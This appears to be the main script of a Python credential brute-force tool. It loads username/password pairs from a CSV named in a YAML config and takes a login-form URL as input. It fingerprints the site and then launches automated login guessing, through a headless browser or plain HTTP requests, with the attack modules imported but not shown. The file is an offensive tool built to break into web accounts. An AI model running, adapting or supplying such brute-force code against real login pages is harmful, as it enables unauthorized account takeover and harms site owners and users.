from datetime import datetime
import WebInfo
import pandas
import argparse
import webParser
import logging
import sys
import json
import yaml
from attack import headless
from attack import htmlBrute

class LoginBrute:
    async def main():

        # Init logging and create log file with "date filename"
        logging.basicConfig(
            filename="logs/" + datetime.now().strftime("%d-%m-%Y %H-%M") + ".log",
            filemode="w",
            level=logging.INFO,
        )

        # create the config yaml config file
        try:
            with open("config.yml", "r") as ymlfile:
                args = yaml.safe_load(ymlfile)

            pass_user = pandas.read_csv(args["pass_user"])

        except IOError as e:
            logging.error(e)
            sys.exit()

        # parse user argument
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "-u", "--url", type=str, help="specify the url to the form", required=True,
        )
        parser.add_argument(
            "-p", "--parallel", help="submit each username with the parallel password in the file", action='store_true'
        )
        
        parser.add_argument("-j", '--javascript', help="initiate the attack with headless browser", action='store_true')
        
        url = parser.parse_args().url
        parallel = parser.parse_args().parallel
        is_javascript = parser.parse_args().javascript
        
        # Retrieve login page technology for example: wordpress, wix...
        web_info = WebInfo.webInfo(url, args["Technologies"], is_javascript)
        web_parser = webParser.webParser()
        await web_parser.getsource(web_info.url, args["params_list"], pass_user)

        logging.info(json.dumps(args, indent=2, default=str))
        logging.info(json.dumps(web_parser.__dict__, indent=2, default=str))

        # Check if page is written in javascript/typescript and use the proper attack accordingly
        if web_info.is_javascript: 
            logging.info("[main]: headless: True")
            headless1 = headless.headless(web_info.url, web_parser, pass_user, parallel)
            await headless1.brute()
        else:
            logging.info("[main]: requests: True")
            html_brute = htmlBrute.htmlBrute(web_info.url, web_parser, pass_user, parallel)
            html_brute.brute()

import asyncio
asyncio.run(LoginBrute.main())
